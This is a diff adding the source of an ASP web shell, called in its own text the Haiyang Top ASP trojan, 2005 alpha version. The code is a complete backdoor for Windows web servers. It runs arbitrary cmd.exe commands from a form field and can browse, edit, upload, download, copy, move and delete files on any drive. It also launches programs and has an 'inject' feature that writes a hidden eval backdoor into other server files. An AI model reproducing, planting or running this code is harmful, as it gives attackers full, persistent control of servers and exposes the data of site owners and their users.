+</form></tr></table><br><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
+<tr bgcolor="#EEEEEE" height=18 class="noborder"><td>
+<form name="form11" method="post" action=<%=filename%>?up=yes enctype="multipart/form-data">
+已有物理目录+文件名:
+      <input name="filepath" value="d:\test.asp" size="16">
+          文件地址:
+<input name="file1" type="file"  size="13"> 
+<input type="submit" name="Submit" value=" 上传"> 
+ </form></td></Tr></table>
+</center>
+<%'-----------------免fso代码shell.application开始------------------
+DSnXA = Request.Form("text")   '目录浏览
+if (DSnXA <> "")  then
+set shell=server.createobject("shell.application") '建立shell对象
+set fod1=shell.namespace(DSnXA)
+set foditems=fod1.items
+for each co in foditems
+response.write "<font color=black>" & co.path & "-----" & co.size & "</font><br>"
+next
+end if
+%>
+<%
+DSnXA1 = Request.Form("text1")  '目录拷贝，不能进行文件拷贝
+DSnXA2 = Request.Form("text2")
+if DSnXA1<>"" and DSnXA2<>"" then
+set shell1=server.createobject("shell.application") '建立shell对象
+set fod1=shell1.namespace(DSnXA2)
+for i=len(DSnXA1) to 1 step -1
+if mid(DSnXA1,i,1)="\" then
+   path=left(DSnXA1,i-1)
+   exit for
+end if
+next
+if len(path)=2 then path=path & "\"
+path2=right(DSnXA1,len(DSnXA1)-i)
+set fod2=shell1.namespace(path)
+set foditem=fod2.parsename(path2)
+fod1.copyhere foditem
+response.write "command completed success!"
+end if
+%>
+<%
+DSnXA3 = Request.Form("text3")   '目录移动
+DSnXA4 = Request.Form("text4")
+if DSnXA3<>"" and DSnXA4<>"" then
+set shell2=server.createobject("shell.application") '建立shell对象
+set fod1=shell2.namespace(DSnXA4)
+for i=len(DSnXA3) to 1 step -1
+if mid(DSnXA3,i,1)="\" then
+   path=left(DSnXA3,i-1)
+   exit for
+end if
+next
+if len(path)=2 then path=path & "\"
+path2=right(DSnXA3,len(DSnXA3)-i)
+set fod2=shell2.namespace(path)
+set foditem=fod2.parsename(path2)
+fod1.movehere foditem
+response.write "command completed success!"
+end if
+%>
+<%
+DSnXA5 = Request.Form("text5")    '执行程序要指定路径
+DSnXA6 = Request.Form("text6")
+if DSnXA5<>"" and DSnXA6<>"" then
+set shell3=server.createobject("shell.application") '建立shell对象
+shell3.namespace(DSnXA5).items.item(DSnXA6).invokeverb
+response.write "command completed success!"
+end if
+%>
+<br><br>
+<center><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
+<tr bgcolor="#EEEEEE" height=18 class="noborder">
+      <td colspan=2 align=center><form method="POST" action=""&url&"">
+Enter Password：<input type="password" name="password" size="20">
+<input type="submit" value="LOGIN"></td>
+   </tr>
+</form></td></tr></table>
+</center>
+</body>
+<%end sub%>
+<% end if %>
+<%sub main()'---------------------免fso代码结束，fso代码开始---------------------
+urlpath=Request.ServerVariables("SERVER_NAME")
+dim cpath,lpath
+if Request("path")="" then
+lpath="/"
+else
+lpath=Request("path")&"/"
+end if
+if Request("attrib")="true" then
+cpath=lpath
+attrib="true"
+else
+cpath=Server.MapPath(lpath)
+attrib=""
+end if
+%><html>
+<script language="JavaScript">
+function crfile(ls)
+{if (ls==""){alert("请输入文件名!");}
+else {window.open("<%=url%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
+return false;
+}
+function crdir(ls)
+{if (ls==""){alert("请输入文件名!");}
+else {window.open("<%=url%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
+return false;
+}
+</script>
+<script language="vbscript">
+sub rmdir(ls)
+if confirm("你真的要删除这个目录吗!"&Chr(13)&Chr(10)&"目录为："&ls)   then
+window.open("<%=url%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
+end if
+end sub
+sub copyfile(sfile)
+dfile=InputBox(""&Chr(13)&Chr(10)&"源文件："&sfile&Chr(13)&Chr(10)&"请输入目标文件的文件名:"&Chr(13)&Chr(10)&"许带路径,要根据你的当前路径模式. 注意:绝对路径示例c:/或c:\都可以")
+dfile=trim(dfile)
+attrib="<%=request("attrib")%>"
+if dfile<>"" then
+if InStr(dfile,":") or InStr(dfile,"/")=1 then
+lp=""
+if InStr(dfile,":") and attrib<>"true" then
+alert "对不起，你在相对路径模式下不能使用绝对路径"&Chr(13)&Chr(10)&"错误路径：["&dfile&"]"
+exit sub
+end if
+else
+lp="<%=lpath%>"
+end if
+window.open(""&url&"?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
+else
+alert"您没有输入文件名！"
+end If
+end sub
+</script><body bgcolor="#F5F5F5">
+<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
+bgColor=#b8b8b8 border=0 class="noborder">
+<TBODY>
+<TR >
+<TD
+height=22 colspan="4" bgcolor="#EEEEEE" >切换盘符：
+<%
+For Each thing in objfsolhn.Drives
+Response.write "<a href='"&url&"?path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&"盘:</a>          "
+NEXT
+%>   &nbsp;本机局域网地址：<% On Error Resume Next %> 
+<%= "\\" & oScriptNetlhn.ComputerName & "\" & oScriptNetlhn.UserName %></td>
+</TR>  <TD colspan="4" bgcolor="#EEEEEE" ><%
+if Request("attrib")="true"  then
+response.write "<a href='"&url&"'><font color='#D00000'>点击切换到相对路径编辑模式</font></a>"
+else
+response.write "<a href='"&url&"?attrib=true'><font color='#D00000'>点击切换到绝对路径编辑模式</font></a>"
+end if
+%>&nbsp路径: <%=cpath%>  &nbsp;&nbsp;当前浏览目录:<%=lpath%>
+</TD></TR> <TR>
+<TD height=22 colspan="4" bgcolor="#EEEEEE" >
+<form name="form1" method="post" action="<%=url%>" >
+浏览目录: <input type="text" name="path" size="30" value="c:">
+<input type="hidden" name="attrib" value="true">
+<input type="submit" name="Submit" value="浏览目录" > 〖请用绝对路径〗
+&nbsp&nbsp&nbsp<input type="submit" name="Submit1" value="返回免fso页面">
+</TD></form>
+<%
+if request.form("submit1")="返回免fso页面" then
+call out() 
+end if%> 
+</TR>
+<TR bgcolor="#EEEEEE">
+<TD colspan="4" >
+<%
+DSnXA = Request.Form(".CMD")
+If (DSnXA <> "") Then
+szTempFile = "c:\" & objfsolhn.GetTempName( )
+Call oScriptlhn.Run ("cmd.exe /c " & DSnXA & " > " & szTempFile, 0, True)
+Set oFilelcx = objfsolhn.OpenTextFile (szTempFile, 1, False, 0)
+End If%>
+<FORM action="<%= Request.ServerVariables("URL") %>" method="POST" name=userdata>
+<input type=text name=".CMD" size=83 value="<%= DSnXA %>">
+<input type=submit value="cmd命令"></td></form></Tr> 
+<TR bgcolor="#EEEEEE">
+<TD colspan="4" >
+<form name="form11" method="post" action=<%=filename%>?up=yes enctype="multipart/form-data">
+已有物理目录+文件名:
+      <input name="filepath" value="d:\test.asp" size="22">
+文件地址:
+<input name="file1" type="file"  size="20"> 
+<input type="submit" name="Submit" value=" 上传"> </td>
+ </form></tr>
+<TR bgcolor="#EEEEEE">
+<TD colspan="4" >
+<form action="<%= Request.ServerVariables("URL") %>" method="post">
+关键字搜索： <input type="text" size="30" name="SearchString" value="<%=SearchString%>"> <input type="text" size="15" name="path88" value=物理路径的目录><input
+type="submit" value="可用于检索存在的asp木马"></td> 
+</form></tr>
+<TR bgColor=#EEEEEE>
+<TD height=22 colspan="4" ><form name="newfile"
+onSubmit="return crfile(newfile.filename.value);">
+<input type="text" name="filename" size="40">
+<input type="submit" value="新建文件" >
+<input type="button" value="新建目录"onclick="crdir(newfile.filename.value)">〖新建文件和新建目录不能同名〗
+</TD></form>
+<pre>
+<% If (IsObject(oFilelcx)) Then
+Response.Write Server.HTMLEncode(oFilelcx.ReadAll)
+oFilelcx.Close
+Call objfsolhn.DeleteFile(szTempFile, True)
+End If %>
+<%
+Set fd = objfsolhn.GetFolder(Request("path88")&"\")
+If SearchString <> "" Then
+Response.Write "<H2>如下脚本文件内嵌入搜索的<font color=red>" & SearchString & "</font>关键字：</H2><P>"
+SearchFolder fd,SearchString
+End If
+%>
+</TR>
+<TR>
+<TD height=22 width="26%" rowspan="2" valign="top" bgColor=#EEEEEE >
+<%
+dim theFolder,theSubFolders
+if objfsolhn.FolderExists(cpath)then
+Set theFolder=objfsolhn.GetFolder(cpath)
+Set theSubFolders=theFolder.SubFolders
+Response.write"<a href='"&url&"?path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#FF8000'>■</font>↑<font color='ff2222'>回上级目录</font></a><br>"
+For Each x In theSubFolders%>
+<%Response.write"<a href='"&url&"?path="&lpath&x.Name&"&oldpath="&Request("path")&"&attrib="&attrib&"'>└<font color='#FF8000'>■</font>  "&x.Name&"</a> <a href="&chr(34)&"javascript: rmdir('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' >×</font>删除</a><br>"
+Next
+end if
+%>
+</TD>
+<TD  width="45%"  bgColor=#EEEEEE>文件名 （鼠标移到文件名可以查看给文件的属性）</TD>
+<TD width="11%" bgColor=#EEEEEE>大小（字节）</TD>
+<TD width="18%" bgColor=#EEEEEE>文件操作</TD>
+</TR>
+<TR>
+<TD height=200 colspan="3" valign="top" bgColor=#EEEEEE>
+<%
+dim theFiles
+if objfsolhn.FolderExists(cpath)then
+Set theFolder=objfsolhn.GetFolder(cpath)
+Set theFiles=theFolder.Files
+Response.write"<table  width='100%' border='0' cellspacing='0' cellpadding='2'>"
+For Each x In theFiles
+if Request("attrib")="true" then
+showstring="<strong>"&x.Name&"</strong>"
+else
+showstring="<a href='"&lpath&x.Name&"' title='"&"类型"&x.type&chr(10)&"属性"&x.Attributes&chr(10)&"时间："&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
+end if
+Response.write"<tr><td width='50%'  style='border-bottom:1 solid #000000;'><font color='#FF8000'>□</font>"&showstring&"</td><td width='8%'  style='border-bottom:1 solid #000000;'>"&x.size&"</a></td><td width='20%'  style='border-bottom:1 solid #000000;'><a href='"&url&"?id=edit&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' >&nbsp;edit</a><a href="&chr(34)&"javascript: copyfile('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' ></font>&nbsp;copy</a><a href='"&url&"?id=edit&path="&lpath&x.Name&"&op=del&attrib="&attrib&"' target='_blank' >&nbsp;del</a><a href='"&url&"?id=down&path="&Server.URlEncode(lpath&x.Name)&"&attrib="&attrib&"' target='_blank' >&nbsp;down</a><a href='"&url&"?id=inject&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' >&nbsp;inject</a></td></tr>"
+Next
+end if
+Response.write"</table>"
+%>
+</TD>
+</TR></TBODY>
+</TABLE>
+<% end sub
+sub edit()
+if request("op")="del"  then
+'**********删除文件********
+if Request("attrib")="true" then
+whichfile=Request("path")
+else
+whichfile=server.mappath(Request("path"))
+end if
+Set thisfile = objfsolhn.GetFile(whichfile)
+thisfile.Delete True
+Response.write "<br><center>删除成功！要刷新才能看到效果.</center>"
+'**********删除文件结束********
+else
+if request("op")="copy" then
+'**********复制文件********
+if Request("attrib")="true" then
+whichfile=Request("path")
+dsfile=Request("dpath")
+else
+whichfile=server.mappath(Request("path"))
+dsfile=Server.MapPath(Request("dpath"))
+end if
+Set thisfile = objfsolhn.GetFile(whichfile)
+thisfile.copy dsfile
+Response.write "<center><p>源文件："+whichfile+"</center>"
+Response.write "<center><br>目的文件："+dsfile+"</center>"
+Response.write "<center><br>复制成功！要刷新才能看到效果!</p></center>"
+'**********复制文件结束********
+else
+if request.form("text")="" then
+if Request("creat")<>"yes" then
+if Request("attrib")="true" then
+whichfile=Request("path")
+else
+whichfile=server.mappath(Request("path"))
+end if
+Set thisfile = objfsolhn.OpenTextFile(whichfile, 1, False)
+counter=0
+thisline=Server.HTMLEncode(thisfile.readall) 
+thisfile.Close
+end if
+%>
+<form method="POST" action=""&url&"?id=edit">
+<input type="hidden" name="attrib" value="<%=Request("attrib")%>">
+<br>
+<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
+bgColor=#b8b8b8 border=0 class="noborder">
+<TBODY>
+<TR >
+<TD
+height=22 bgcolor="#EEEEEE" ><div align="center">海阳顶端网ASP木马＠2005α版文件编辑器</div></TD>
+</TR>
+<TR >
+<TD width="100%"
+height=22 bgcolor="#EEEEEE" >文件名：
+<input type="text" name="path" size="45"
+value="<%=Request("path")%>"readonly>
+</TD></TR><TR>
+<TD
+height=22 bgcolor="#EEEEEE" > <div align="center">
+<textarea rows="25" name="text" cols="105"><%=thisline%></textarea>
+</div></TD></TR><TR>
+<TD
+height=22 bgcolor="#EEEEEE" ><div align="center">
+<input type="submit"
+value="提交" name="B1">
+<input type="reset" value="复原" name="B2">
+</div></TD>
+</TR>
+</TABLE>
+</form>
+<%else
+if Request("attrib")="true" then
+whichfile=Request("path")
+else
+whichfile=server.mappath(Request("path"))
+end if
+Set outfile=objfsolhn.CreateTextFile(whichfile)
+outfile.WriteLine Request("text")
+outfile.close
+Response.write "<center>修改成功！要刷新才能看到效果!</center>"
+end if
+end if
+end if
+end sub
+%>
+<% sub dir()
+if request("op")="del"  then
+'***********删除目录**********
+if Request("attrib")="true" then
+whichdir=Request("path")
+else
+whichdir=server.mappath(Request("path"))
+end if
+objfsolhn.DeleteFolder whichdir,True
+Response.write "<center>删除成功！要刷新才能看到效果，删除的目录为:<b>"&whichdir&"</b></center>"
+'**********删除目录结束*************
+else
+'***********新建目录**********
+if request("op")="creat"  then
+if Request("attrib")="true" then
+whichdir=Request("path")
+else
+whichdir=server.mappath(Request("path"))
+end if
+objfsolhn.CreateFolder whichdir
+Response.write "<center>建立成功！要刷新才能看到效果,建立的目录为:<b>"&whichdir&"</b></center>"
+'***********新建目录结束**********
+end if
+end if
+end sub
+'****下载文件
+function downloadFile(strFile)
+if  request("attrib")="" then
+strFilename = server.MapPath(strFile)
+end if
+if  request("attrib")="true" then
+strFilename = Request("path")
+end if
+Response.Buffer = True
+Response.Clear
+Set s = Server.CreateObject("ADODB.Stream")
+s.Open
+s.Type = 1
+on error resume next
+ if not objfsolhn.FileExists(strFilename) then
+  Response.Write("<h1>Error:</h1>" & strFilename & " does not exist<p>")
+  Response.End
+ end if
+ Set f = objfsolhn.GetFile(strFilename)
+ intFilelength = f.size
+s.LoadFromFile(strFilename)
+ if err then
+  Response.Write("<h1>Error: </h1>" & err.Description & "<p>")
+  Response.End
+ end if
+ Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
+ Response.AddHeader "Content-Length", intFilelength
+ Response.CharSet = "UTF-8"
+ Response.ContentType = "application/octet-stream"
+  Response.BinaryWrite s.Read
+ Response.Flush
+ s.Close
+ Set s = Nothing
+ response.end
+End Function 
+%>
+<%'插入文件
+sub inject()
+if Request("id")="inject"  and request("attrib")<>"true"then
+testfile=Server.MapPath(""&Request("path")&"")
+set thisfile=objfsolhn.OpenTextFile(testfile,8,True,0)
+thisfile.WriteLine("<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>try{eval(Request.form('#')+'')}catch(e){}</SCRIPT>")
+thisfile.close
+Response.write "succeed!请用冰狐浪子asp后门来来访问你插入的文件"&Request("path")&"默认密码是#"
+else 
+Response.write "<form method='POST' action='"&Request.ServerVariables("URL")&"?id=inject'>"
+Response.write "<input type='text' name='path' readonly value='"&Request("path")&"'>"
+Response.write "<input name='submit' type='submit' value='这里你插入什么呀，它是物理目录文件了' ></form>"
+end if
+end sub
+%>
+<%function fieldtype(typeid)
+select case typeid
+	case 130	fieldtype = "文本"
+	case 2		fieldtype = "整型"
+	case 3		fieldtype = "长整型"
+	case 7		fieldtype = "日期/时间"
+	case 5		fieldtype = "双精度型"
+	case 11		fieldtype = "是/否"
+	case 128	fieldtype = "OLE 对象"
+	case else	fieldtype = typeid
+end select
+end function
+function fillbefore(str,prefix,totallen)
+str=CStr(str)
+if len(str)<totallen then
+	for i=1 to totallen-len(str)
+		str = prefix & str
+	next
+end if
+fillbefore = str
+end function
+ %>
+<br>
+<CENTER>警告：对非法使用此程序可能带来的任何不良后果责任自负！海阳顶端网<br></center>
+<center>此版本感谢：网辰在线、桂林老兵、冰狐浪子、蓝屏、小路、wangyong、czy、sun.c所做的一切努力◆LCX&ALLEN◆</center>
+</body>
+</html>
